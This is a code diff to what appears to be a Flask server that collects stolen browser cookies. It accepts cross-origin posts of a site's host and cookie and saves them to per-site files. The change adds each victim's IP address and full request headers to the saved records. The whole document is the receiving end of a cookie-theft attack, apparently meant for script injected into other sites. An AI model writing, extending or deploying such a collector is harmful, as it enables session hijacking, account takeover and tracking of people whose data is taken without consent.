@@ -13,16 +13,16 @@ from flask_cors import CORS
 from config import *
 
 
-async def save_data(data):
+async def save_data(data, ip, header):
     get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
     if os.path.isdir(f"{os.getcwd()}/cookies"):
         with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
-            f.write(get_time + '\t' + data['cookie'] + '\n')
+            f.write(get_time + '\t' + ip + '\t' + data['cookie'] + '\n' + header + '\n')
     else:
         os.mkdir(f"{os.getcwd()}/cookies")
         with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
-            f.write(get_time + '\t' + data['cookie'] + '\n')
+            f.write(get_time + '\t' + ip + '\t' + data['cookie'] + '\n' + header + '\n')
 
 
 app = Flask(__name__)
@@ -33,7 +33,10 @@ CORS(app, resources=r'/*')
 async def get_cookie():
     data = request.get_data().decode()
     data = json.loads(data)
-    await save_data(data)
+    request_ip = request.remote_addr
+    headers = str(request.headers)
+    headers = headers.replace("\n","")
+    await save_data(data, request_ip, headers)
     return "success"
 
 
